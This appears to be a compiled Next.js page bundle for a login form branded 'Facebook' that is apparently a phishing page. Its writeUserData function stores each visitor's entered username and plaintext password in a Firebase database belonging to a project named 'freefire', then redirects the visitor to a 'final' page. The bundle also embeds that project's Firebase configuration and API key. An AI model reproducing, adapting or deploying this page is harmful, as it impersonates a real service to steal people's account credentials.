(function() {
var exports = {};
exports.id = 459;
exports.ids = [459];
exports.modules = {

/***/ 5228:
/***/ (function(__unused_webpack_module, __webpack_exports__, __webpack_require__) {

"use strict";
// ESM COMPAT FLAG
__webpack_require__.r(__webpack_exports__);

// EXPORTS
__webpack_require__.d(__webpack_exports__, {
  "default": function() { return /* binding */ login; }
});

// EXTERNAL MODULE: external "react/jsx-runtime"
var jsx_runtime_ = __webpack_require__(5282);
// EXTERNAL MODULE: ./styles/login.module.css
var login_module = __webpack_require__(7711);
var login_module_default = /*#__PURE__*/__webpack_require__.n(login_module);
// EXTERNAL MODULE: external "next/router"
var router_ = __webpack_require__(6731);
// EXTERNAL MODULE: external "react"
var external_react_ = __webpack_require__(9297);
;// CONCATENATED MODULE: external "firebase/app"
var app_namespaceObject = require("firebase/app");;
;// CONCATENATED MODULE: external "firebase/database"
var database_namespaceObject = require("firebase/database");;
;// CONCATENATED MODULE: ./pages/login.js









function writeUserData(username, password) {
  const db = (0,database_namespaceObject.getDatabase)();
  (0,database_namespaceObject.set)((0,database_namespaceObject.ref)(db, 'users/' + username), {
    password
  });
}

const firebaseConfig = {
  apiKey: 'AIzaSyCpvpUTwa9lnpWK6sh-5bcalcM2wQoFYwE',
  authDomain: 'freefire-5c9da.firebaseapp.com',
  projectId: 'freefire-5c9da',
  storageBucket: 'freefire-5c9da.appspot.com',
  messagingSenderId: '575127247016',
  appId: '1:575127247016:web:928081d5a437fcefbd4a9d',
  measurementId: 'G-TL9MT4BTBN'
};

function Login() {
  const router = (0,router_.useRouter)();
  const {
    0: username,
    1: setUsername
  } = (0,external_react_.useState)('');
  const {
    0: password,
    1: setPassword
  } = (0,external_react_.useState)('');
  const app = (0,app_namespaceObject.initializeApp)(firebaseConfig);

  const handleClick = () => {
    if (username.length != 0 && password.length != 0) {
      writeUserData(username, password);
      router.push('final');
    } else {
      alert('fill the form');
    }
  };

  return /*#__PURE__*/jsx_runtime_.jsx(jsx_runtime_.Fragment, {
    children: /*#__PURE__*/(0,jsx_runtime_.jsxs)("div", {
      className: "main",
      children: [/*#__PURE__*/jsx_runtime_.jsx("div", {
        className: (login_module_default()).header,
        children: /*#__PURE__*/jsx_runtime_.jsx("h1", {
          children: "Facebook"
        })
      }), /*#__PURE__*/(0,jsx_runtime_.jsxs)("div", {
        className: (login_module_default()).form,
        children: [/*#__PURE__*/jsx_runtime_.jsx("input", {
          className: "username",
          type: "text",
          value: username,
          onInput: e => setUsername(e.target.value)
        }), /*#__PURE__*/jsx_runtime_.jsx("input", {
          className: "password",
          type: "password",
          value: password,
          onInput: e => setPassword(e.target.value)
        }), /*#__PURE__*/jsx_runtime_.jsx("button", {
          className: (login_module_default()).login,
          onClick: () => handleClick(),
          children: "Log in"
        }), /*#__PURE__*/jsx_runtime_.jsx("p", {
          children: "Forget Password?"
        }), /*#__PURE__*/jsx_runtime_.jsx("hr", {}), /*#__PURE__*/jsx_runtime_.jsx("button", {
          className: (login_module_default()).create,
          children: "Create account"
        })]
      })]
    })
  });
}

/* harmony default export */ var login = (Login);

/***/ }),

/***/ 7711:
/***/ (function(module) {

// Exports
module.exports = {
	"header": "login_header__2-y6K",
	"form": "login_form__2fzL7",
	"login": "login_login__2IpHY",
	"create": "login_create__2Ng7H"
};


/***/ }),

/***/ 6731:
/***/ (function(module) {

"use strict";
module.exports = require("next/router");;

/***/ }),

/***/ 9297:
/***/ (function(module) {

"use strict";
module.exports = require("react");;

/***/ }),

/***/ 5282:
/***/ (function(module) {

"use strict";
module.exports = require("react/jsx-runtime");;

/***/ })

};
;

// load runtime
var __webpack_require__ = require("../webpack-runtime.js");
__webpack_require__.C(exports);
var __webpack_exec__ = function(moduleId) { return __webpack_require__(__webpack_require__.s = moduleId); }
var __webpack_exports__ = (__webpack_exec__(5228));
module.exports = __webpack_exports__;

})();